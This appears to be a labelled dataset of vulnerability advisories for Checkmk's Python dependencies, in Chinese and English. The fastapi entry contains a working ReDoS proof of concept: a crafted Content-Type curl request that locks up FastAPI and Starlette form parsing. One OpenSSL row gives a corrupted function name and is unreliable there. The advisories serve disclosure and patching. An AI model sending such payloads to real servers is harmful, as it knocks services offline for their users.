- [GitHub Commit](https://github.com/boto/botocore/commit/5e044f7b94acb83fce4265b5ce47620db70a9876)
- [GitHub PR](https://github.com/boto/botocore/pull/1405)
",3,0
Checkmk_checkmk,cryptography,,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
Checkmk_checkmk,cryptography,,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
Checkmk_checkmk,cryptography,,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
Checkmk_checkmk,cryptography,,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
Checkmk_checkmk,cryptography,,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
Checkmk_checkmk,cryptography,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
Checkmk_checkmk,cryptography,,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
Checkmk_checkmk,cryptography,,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
Checkmk_checkmk,cryptography,,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
Checkmk_checkmk,cryptography,,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
Checkmk_checkmk,cryptography,,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
Checkmk_checkmk,cryptography,,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
Checkmk_checkmk,defusedxml,,True,CVE-2013-1664,CWE-119,2013-01-16,"OpenStack是由Rackspace和NASA共同开发的云计算平台，帮助服务商和企业内部实现类似于Amazon EC2和S3的云基础架构。
多款OpenStack产品中存在拒绝服务漏洞，该漏洞源于在扩展XML实体时存在错误。攻击者利用该漏洞通过特制的XML文档，消耗系统大量内存，并使系统崩溃或挂起。",3,2
Checkmk_checkmk,defusedxml,,True,CVE-2013-1665,CWE-200,2013-01-16,"OpenStack是由Rackspace和NASA共同开发的云计算平台，帮助服务商和企业内部实现类似于Amazon EC2和S3的云基础架构。
多款OpenStack产品中存在信息泄露漏洞，该漏洞源于在处理某些XML数据时存在错误。攻击者利用该漏洞通过特制的XML文档(包含外部实体引用)，可获得敏感信息。",3,2
Checkmk_checkmk,fastapi,,True,CVE-2021-32677,CWE-352,2021-06-09,"fastapi-utils是一个应用软件。可重用工具为FastAPI
fastapi-utils存在跨站请求伪造漏洞，该漏洞源于FastAPI 0.65.2版本及以下版本在接收浏览器发送的JSON负载的路径操作中使用cookie进行身份验证，容易受到跨站点请求伪造(CSRF)攻击。",2,2
Checkmk_checkmk,fastapi,,True,CVE-2024-24762,CWE-400 CWE-1333,,python-multipart是由个人开发者Marcelo Trylesinski开发的一个Python流式多部分解析器。该组件用于解析HTTP请求中的内容类型。此漏洞发生在版本0.0.7之前，攻击者可以通过发送特制的Content-Type头部，该头部使得正则表达式解析过程消耗过多的CPU资源，导致服务无法响应其他请求。此问题源于不当的正则表达式使用，造成灾难性回溯，进而使主事件循环无限期停止。,2,1
Checkmk_checkmk,fastapi,,True,,CWE-1333 CWE-400,2024-02-06,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-2jv5-9r88-3w3p. This link is maintained to preserve external references.

## Original Description

### Summary

When using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.

An attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.

This can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

This only applies when the app uses form data, parsed with `python-multipart`.

### Details

A regular HTTP `Content-Type` header could look like:

```
Content-Type: text/html; charset=utf-8
```

`python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74

A custom option could be made and sent to the server to break it with:

```
Content-Type: application/x-www-form-urlencoded; !=\""\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
```

This is also reported to Starlette at: https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238

### PoC

Create a FastAPI app that uses form data:

```Python
# main.py
from typing import Annotated
from fastapi.responses import HTMLResponse
from fastapi import FastAPI,Form
from pydantic import BaseModel

class Item(BaseModel):
    username: str

app = FastAPI()

@app.get(""/"", response_class=HTMLResponse)
async def index():
    return HTMLResponse(""Test"", status_code=200)

@app.post(""/submit/"")
async def submit(username: Annotated[str, Form()]):
    return {""username"": username}

@app.post(""/submit_json/"")
async def submit_json(item: Item):
    return {""username"": item.username}
```

Then start it with:

```console
$ uvicorn main:app

INFO:     Started server process [50601]
INFO:     Waiting for application startup.
INFO:     ASGI 'lifespan' protocol appears unsupported.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
```

Then send the attacking request with:

```console
$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\""\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'
```

#### Stopping it

Because that holds the main loop consuming the CPU non-stop, it's not possible to simply kill Uvicorn with `Ctrl+C` as it can't handle the signal.

To stop it, first check the process ID running Uvicorn:

```console
$ ps -fA | grep uvicorn

  501 59461 24785   0  4:28PM ttys004    0:00.13 /Users/user/code/starlette/env3.10/bin/python /Users/user/code/starlette/env3.10/bin/uvicorn redos_starlette:app
  501 59466 99935   0  4:28PM ttys010    0:00.00 grep uvicorn
```

In this case, the process ID was `59461`, then you can kill it (forcefully, with `-9`) with:

```console
$ kill -9 59461
```

### Impact

It's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data, using `python-multipart`. This way it also affects other libraries using Starlette, like FastAPI.

### Original Report

This was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r

<details>
<summary>Original report to FastAPI</summary>

Hey Tiangolo!

My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).

Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:

```Python
from typing import Annotated
from fastapi.responses import HTMLResponse
from fastapi import FastAPI,Form
from pydantic import BaseModel

class Item(BaseModel):
    username: str

app = FastAPI()

@app.get(""/"", response_class=HTMLResponse)
async def index():
    return HTMLResponse(""Test"", status_code=200)

@app.post(""/submit/"")
async def submit(username: Annotated[str, Form()]):
    return {""username"": username}

@app.post(""/submit_json/"")
async def submit_json(item: Item):
    return {""username"": item.username}
```

I'm running the above with uvicorn with the following command:

```console
uvicorn server:app
```

Then run the following cUrl command:

```
curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\""\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'
```

You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%

You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.

If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.

Cheers

#### Impact

An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.

#### Occurrences

[params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)

</details>",2,2
Checkmk_checkmk,feedparser,,True,CVE-2011-1156,CWE-399,2011-04-11,Universal Feed Parser(又名feedparser或者python-feedparser）5.0.1之前版本中的feedparser.py中存在资源管理错误漏洞。在解析某些HTML / DOCTYPE组合时产生的错误，可引起异常反应，远程攻击者可以借助畸形DOCTYPE声明导致拒绝服务，解析器崩溃。,2,2
Checkmk_checkmk,feedparser,,True,CVE-2009-5065,CWE-79,2011-04-11,Universal Feed Parser(又名feedparser或者python-feedparser）5.0之前版本中的feedparser.py中存在跨站脚本攻击漏洞。远程攻击者可以借助与嵌入CDATA节有关的向量，注入任意web脚本或者HTML。,3,1
Checkmk_checkmk,feedparser,,True,CVE-2011-1157,CWE-79,2011-04-11,Universal Feed Parser(又名feedparser或者python-feedparser）5.0.1之前版本中的feedparser.py中存在跨站脚本攻击漏洞。 由于某些XML注释的输入在使用之前没有经过正确过滤，当浏览恶意数据时，远程攻击者可以借助该漏洞在受影响站点的用户浏览器会话中注入任意web脚本或者HTML。,3,0
Checkmk_checkmk,feedparser,,True,CVE-2011-1158,CWE-79,2011-04-11,Universal Feed Parser(又名feedparser或者python-feedparser）5.0.1之前版本的feedparser.py中存在跨站脚本攻击漏洞。由于某些URI schemes的输入在使用之前没有经过正确过滤，当浏览恶意数据时，远程攻击者可利用此漏洞在受影响站点的用户浏览器会话中注入任意HTML及脚本代码。,3,0
Checkmk_checkmk,feedparser,,True,CVE-2012-2921,CWE-399,2012-05-21,Universal Feed Parser（也称feedparser或者 python-feedparser）5.1.2之前版本中存在漏洞。远程攻击者可利用该漏洞借助特制非ASCII编码文档的XML ENTITY声明导致拒绝服务（内存消耗）。,2,2
Checkmk_checkmk,flask,,True,CVE-2018-1000656,CWE-20,2018-08-20,"Pallets Project Flask是Pallets项目的一款轻量级的WSGI（Web服务器网关接口）应用程序框架。
Pallets Project flask 0.12.3之前版本中存在输入验证漏洞。攻击者可借助JSON数据利用该漏洞造成拒绝服务（大量内存消耗）。",2,2
Checkmk_checkmk,flask,,True,,CWE-23,2017-09-14,"## Overview
Affected versions of [`flask`](https://pypi.python.org/pypi/Flask) are vulnerable to Arbitrary File Download. A client can use backslashes to escape the directory the files where exposed from.
**Note:** Only if the host server is a windows based operating system.

## References
- [GitHub Changelog](https://github.com/pallets/flask/blob/master/CHANGES)
- [GitHub Commit](https://github.com/pallets/flask/commit/aeed530e3221c1b445c13269dcd2fb67548bcefc)
",4,0
Checkmk_checkmk,flask,,True,CVE-2023-30861,CWE-539,2023-05-02,"Pallets Project Flask是Pallets项目的一款轻量级的WSGI（Web服务器网关接口）应用程序框架。
Flask存在安全漏洞，该漏洞源于用于一个客户端的数据响应可能会被缓存并随后由代理发送给其他客户端。",2,1
Checkmk_checkmk,flask,,True,CVE-2019-1010083,CWE-20,2019-07-17,"Pallets Project Flask是Pallets项目的一款轻量级的WSGI（Web服务器网关接口）应用程序框架。
Pallets Project Flask 1.0之前版本中存在资源管理错误漏洞。攻击者可借助特制的被编码的JSON输入利用该漏洞造成拒绝服务。",2,2
Checkmk_checkmk,GitPython,,True,,CWE-1333,2022-02-21,"## Overview
[GitPython](https://pypi.org/project/GitPython/) is a python library used to interact with Git repositories

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) when a user controls the input passed to the pattern matching function.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `GitPython` to version 3.1.27 or higher.
## References
- [GitHub Commit](https://github.com/gitpython-developers/GitPython/commit/75f4f63ab3856a552f06082aabf98845b5fa21e3)
",3,0
Checkmk_checkmk,GitPython,,True,CVE-2024-22190,CWE-426,2024-01-10,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.40及之前版本存在代码问题漏洞，该漏洞源于允许攻击者通过不受信任的搜索路径执行任意代码。",2,0
Checkmk_checkmk,GitPython,,True,CVE-2023-40267,CWE-94,2023-08-11,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32之前版本存在安全漏洞，该漏洞源于没有阻止clone和clone_from中不安全的non-multi选项。",1,2
Checkmk_checkmk,GitPython,,True,CVE-2023-40590,CWE-426,2023-08-28,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32及之前版本存在代码问题漏洞，该漏洞源于攻击者可以诱骗用户下载带有恶意git可执行文件的存储库，攻击者可以运行任何任意命令。",2,0
Checkmk_checkmk,GitPython,,True,CVE-2023-41040,CWE-22,2023-08-30,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32及之前版本存在路径遍历漏洞，该漏洞源于为了解析一些 git 引用，GitPython 从目录中读取文件.git，在某些情况，GitPython 不会检查该文件是否位于目录之外.git，导致攻击者可以让 GitPython 从系统中读取任何文件。",3,0
Checkmk_checkmk,GitPython,,True,CVE-2022-24439,CWE-20,2022-12-06,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython存在安全漏洞，该漏洞源于不正确的用户输入验证，攻击者利用该漏洞可以远程代码执行。",1,1
Checkmk_checkmk,jinja2,,True,CVE-2014-0012,CWE-264,2014-01-18,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
Jinja2 2.7.2版本存在权限许可和访问控制问题漏洞，该漏洞源于程序没有正确创建临时目录。本地攻击者可通利用该漏洞以用户的UID提前创建临时目录，获取特权。",3,0
Checkmk_checkmk,jinja2,,True,CVE-2020-28493,CWE-400,2021-02-01,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
jinja2 from 0.0.0 and before 2.11.3 存在资源管理错误漏洞，该漏洞源于regex的ReDOS漏洞。",3,2
Checkmk_checkmk,jinja2,,True,CVE-2016-10745,CWE-134,2019-04-08,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja中存在格式化字符串错误漏洞。该漏洞源于网络系统或产品接收外部格式化字符串作为参数时，对参数类型、数量等过滤不严格。以下产品及版本受到影响：Pallets Jinja 2.8.1之前版本。",2,2
Checkmk_checkmk,jinja2,,True,CVE-2019-10906,CWE-693,2019-04-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 2.10.1之前版本中存在权限许可和访问控制问题漏洞。攻击者可利用该漏洞绕过沙盒保护。",2,2
Checkmk_checkmk,jinja2,,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
Checkmk_checkmk,jinja2,,True,CVE-2014-1402,CWE-264,2014-01-10,"Jinja2是一个基于Python的模板引擎，它拥有完整的unicode支持，并且提供了可选的沙箱模板执行环境来保证安全。
Jinja2 2.7.1及之前版本的bccache.FileSystemBytecodeCache中的默认配置存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可借助/tmp目录下特制的cache文件利用该漏洞获取特权。",2,0
Checkmk_checkmk,jinja2,,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
Checkmk_checkmk,jinja2,,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
Checkmk_checkmk,jinja2,,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
Checkmk_checkmk,jinja2,,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
Checkmk_checkmk,lxml,,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
Checkmk_checkmk,lxml,,True,CVE-2014-3146,CWE-79,2014-04-15,"lxml是一个使用Python语言编写的用于处理XML和HTML的库。
lxml 3.3.4及之前版本的lxml.html.clean模块中存在不完整黑名单漏洞，该漏洞源于程序没有正确过滤link scheme中的控制字符。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,1
Checkmk_checkmk,lxml,,True,CVE-2021-28957,CWE-79,2021-03-21,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.2 存在跨站脚本漏洞，该漏洞源于HTML5的formaction属性。",3,0
Checkmk_checkmk,lxml,,True,,CWE-22,2020-12-02,"## Overview

Affected versions of this package are vulnerable to Arbitrary File Write. When writing to file paths that contain the URL escape character '%', the file path could wrongly be mangled by URL unescaping and thus write to a different file or directory.
## Remediation
Upgrade `lxml` to version 4.4.0 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/0245aba002f069a0b157282707bdf77418d1b5be)
",3,0
Checkmk_checkmk,lxml,,True,CVE-2020-27783,CWE-79,2020-11-27,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
Lxml 存在跨站脚本漏洞，该漏洞源于javascript通过noscript和style组合进行转义。以下产品及版本会受到影响：Debian stretch, Debian stretch (security), Debian buster, Debian bullseye, sid; Red Hat Software Collections, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 5, Red Hat Enterprise Linux 6, Red Hat Enterprise Linux 7,Red Hat Enterprise Linux 8 , Red Hat OpenStack Platform 10 (Newton), Red Hat OpenStack Platform 13 (Queens)",3,0
Checkmk_checkmk,lxml,,True,CVE-2018-19787,CWE-79,2018-12-02,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.2.5之前版本中存在跨站脚本漏洞，该漏洞源于lxml.html.clean模块的lxml/html/clean.py文件没有移除使用转义的javascript: URLs。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,0
Checkmk_checkmk,lxml,,True,CVE-2021-43818,CWE-74 CWE-79,2021-12-13,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.5之前版本存在注入漏洞，该漏洞源于HTML Cleaner允许某些精心制作的脚本内容以及使用数据URI嵌入的SVG文件中的脚本内容通过。",3,0
Checkmk_checkmk,lxml,,True,,CWE-400,2024-01-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to race conditions when errors or user messages occur during threaded XSLT processing.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `lxml` to version 2.3.4 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/26ae51c60462ba1567a123bc9701ff18f9c10789)
",4,0
Checkmk_checkmk,marshmallow,,True,CVE-2018-17175,CWE-200,2018-09-18,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。marshmallow library是其中的一个用于将复杂对象转换成Python数据类型的轻量级库。

marshmallow library for Python 2.15.1之前版本和3.0.0b9之前的3.x 版本中存在安全漏洞，该漏洞源于在‘only’参数为空的列表时程序会将所有的参数当做None来处理。攻击者可利用该漏洞泄露所有的字段。",3,2
